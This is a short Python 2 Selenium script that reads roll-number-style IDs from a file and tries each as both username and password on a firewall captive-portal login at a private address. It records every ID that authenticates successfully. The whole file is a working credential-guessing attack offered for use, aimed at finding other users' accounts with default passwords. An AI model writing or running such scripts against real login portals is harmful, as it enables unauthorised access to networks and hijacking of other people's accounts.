from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
fo = open("final.txt",'w')
driver = webdriver.Chrome("chromedriver.exe")

    

def textParser():	
	import  re
	pattern = r"([A-Z]+)(\d+)([A-Z]+)"
	frolls = open('numbers.txt','r')
	string = frolls.read()
	matches = re.findall(pattern, string, flags=0)
	matches_final = [''.join(match) for match in matches]
	matches_final += [''.join(match).lower() for match in matches]
	return matches_final
	# print matches_final
def logger(matches_final):
	i = 0
	while 1<len(matches_final):
		name = matches_final[i]
		driver.get("http://172.16.24.1:1000/logout?000a0e020b1241ca")
		uname = driver.find_element_by_name("username")
		uname.send_keys(name)
		passwd = driver.find_element_by_name("password")
		passwd.send_keys(name)
		passwd.send_keys(Keys.RETURN)
		if driver.title == 'Firewall Authentication Keepalive Window':
			print driver.title
			print "connected"
			fo.write(name+'\n')
		i = i+1
		print i
	driver.close()
# try:
logger(textParser())
# except Exception as ex:
	# print ex